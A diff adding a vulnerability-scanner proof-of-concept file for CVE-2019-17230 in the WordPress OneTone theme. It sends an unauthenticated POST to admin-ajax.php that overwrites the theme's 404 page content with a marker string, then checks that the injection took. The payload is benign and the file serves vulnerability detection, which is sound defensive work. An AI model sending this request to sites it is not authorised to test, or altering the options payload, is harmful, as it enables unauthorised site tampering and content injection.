@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "验证WordPress OneTone主题未授权选项修改漏洞，通过发送特制POST请求修改404页面内容并验证注入成功"
+id = "POC-AVE-2019-0116"
+name = "WordPress OneTone theme Unauthenticated Options Changes PoC"
+severity = "medium"
+tags = ["ave-2019-0116"]
+vuln_id = [
+    "CVE-2019-17230",
+    "AVE-2019-0116",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = 'action=onetone_options_import&options={"content_404":"AVE-2019-0116-TEST"}'
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Import successful."]
+
+[[poc.requests]]
+method = "GET"
+path = "/AVE-2019-0116-TEST-PAGE"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE-2019-0116-TEST"]
